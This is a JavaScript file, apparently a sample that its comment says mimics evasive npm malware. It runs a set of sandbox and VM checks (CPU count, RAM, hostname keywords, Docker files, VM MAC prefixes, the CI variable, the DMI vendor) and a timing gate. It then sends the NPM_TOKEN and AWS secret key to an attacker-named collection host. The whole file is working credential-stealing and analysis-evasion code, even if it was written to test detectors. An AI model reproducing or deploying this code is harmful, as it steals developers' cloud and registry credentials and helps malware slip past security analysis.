'use strict';
// Mimics evasive npm malware: runs a battery of sandbox/VM checks and only
// fires the payload if it believes it's on a real developer machine.
const os = require('os');
const fs = require('fs');
const https = require('https');

function looksLikeSandbox() {
  // 1. CPU count too low.
  if (os.cpus().length < 2) return 'cpu-count';
  // 2. Too little RAM.
  if (os.totalmem() < 2 * 1024 * 1024 * 1024) return 'low-ram';
  // 3. Sandbox-ish hostname/username.
  const h = (os.hostname() + os.userInfo().username).toLowerCase();
  if (/sandbox|malware|virus|cuckoo|vmware|virtualbox|test|analy/.test(h)) return 'hostname';
  // 4. Container/VM artifact files.
  if (fs.existsSync('/.dockerenv') || fs.existsSync('/proc/vz')) return 'container';
  // 5. VM MAC address prefixes.
  const ifs = os.networkInterfaces();
  for (const name in ifs) {
    for (const a of ifs[name]) {
      const m = (a.mac || '').toLowerCase();
      if (m.startsWith('08:00:27') || m.startsWith('00:0c:29') || m.startsWith('52:54:00')) return 'vm-mac';
    }
  }
  // 6. CI environment (analysis pipelines).
  if (process.env.CI) return 'ci';
  // 7. DMI vendor says VM.
  try {
    const v = fs.readFileSync('/sys/class/dmi/id/sys_vendor', 'utf8');
    if (/vmware|virtualbox|qemu|xen|kvm/i.test(v)) return 'dmi';
  } catch (e) {}
  // 8. Timing check: real time must pass across a delay.
  return null;
}

function detonate() {
  const stolen = process.env.NPM_TOKEN + '|' + process.env.AWS_SECRET_ACCESS_KEY;
  https.get('https://exfil.attacker-c2.com/collect?d=' + encodeURIComponent(stolen));
}

const reason = looksLikeSandbox();
if (reason) {
  console.log('[!] sandbox detected: ' + reason + ' — aborting');
} else {
  // Timing-gated: only fire after a believable delay has "elapsed".
  const t0 = Date.now();
  setTimeout(function () {
    if (Date.now() - t0 >= 4000) {
      detonate();
    } else {
      console.log('[!] time did not advance — sandbox, aborting');
    }
  }, 5000);
}

module.exports = {};
